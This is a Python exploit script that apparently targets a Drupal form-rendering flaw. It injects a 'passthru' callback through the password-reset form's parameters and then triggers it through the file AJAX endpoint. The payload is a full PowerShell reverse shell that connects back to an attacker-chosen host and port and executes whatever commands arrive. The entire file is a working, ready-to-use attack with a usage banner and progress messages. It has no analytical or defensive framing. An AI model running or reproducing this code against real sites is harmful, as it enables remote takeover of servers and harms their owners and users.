import requests, sys
from bs4 import BeautifulSoup

requests.packages.urllib3.disable_warnings()

if len(sys.argv) != 4:
    print("Usage: python3 <rhost> <lhost> <lport>")
    print("Example: python3 http://150.140.130.100:80 127.0.0.1 1338")
    sys.exit()

rhost = sys.argv[1]
lhost = sys.argv[2]
lport = sys.argv[3]


command = '''powershell -nop -c "$client = '''
command += '''New-Object System.Net.Sockets.TCPClient('%s', %s);''' % (lhost, lport)
command += '''$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"'''


try:
    params = {'q':'user/password',
                'name[#post_render][]': 'passthru',
                'name[#type]': 'markup',
                'name[#markup]': command
                }
    data = {'form_id': 'user_pass', '_triggering_element_name': 'name',
            '_triggering_element_value': '', 'opz': 'E-mail new Password'
            }
    print("[ + ] Sending in the first payload...")
    req = requests.post(url=rhost, params=params, data=data, verify=False)
    print("[ + ] Payload was sent.")
    print(75 * '-')
except Exception as e:
    sys.exit(f"[ ! ] Exception occured: {e}")


html = BeautifulSoup(req.text, "html.parser")
form_id = html.find('input', {'name': 'form_build_id'}).get('value')


if form_id:
    try:
        params = {'q': f'file/ajax/name/#value/{form_id}'}
        data = {'form_build_id': form_id}
        print("[...] Executing payload, check your listener.")
        req = requests.post(url=rhost, params=params, data=data, verify=False, timeout=20)
    except Exception as e:
        sys.exit(f"[ ! ] Exception occured: {e}")
else:
    sys.exit("[ - ] Couldn't find form_build_id's value, exiting")


